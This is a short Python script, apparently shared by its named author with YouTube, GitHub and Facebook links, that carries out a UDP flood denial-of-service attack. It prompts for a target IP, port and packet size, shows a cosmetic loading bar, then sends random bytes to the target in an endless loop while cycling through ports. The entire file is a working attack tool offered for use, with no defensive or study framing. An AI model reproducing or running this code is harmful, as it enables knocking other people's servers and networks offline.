import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#############

##GREETING##
os.system("clear")
os.system("figlet DDos Attack")
print ('''
Author   : HA-MRX
You Tube : https://www.youtube.com/c/HA-MRX
github   : https://github.com/Ha3MrX
Facebook : https://www.facebook.com/muhamad.jabar222
''')
##GREETING##

##INPUT AND CREATE RANDOM BYTES##
ip = input("IP Target : ")
port = int(input("Port       : "))
strenght = int(input("Select power(Default: 1490): "))
if(strenght != ''):
	bytes = random._urandom(strenght)
else:
	bytes = random._urandom(1490)
os.system("clear")
##INPUT AND CREATE RANDOM BYTES##

##LOADING BAR##
statbar = 0
allbar = 50
while(statbar < 51):
	os.system("figlet Attack Starting")
	print ("[" + "="*statbar + ">" + " "*allbar + "]" + str(statbar*2) + "%")
	statbar += 1
	allbar -= 1
	time.sleep(0.07)
	os.system("clear")
##LOADING BAR##

##ATTACK##
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent += 1
     port += 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
##ATTACK##
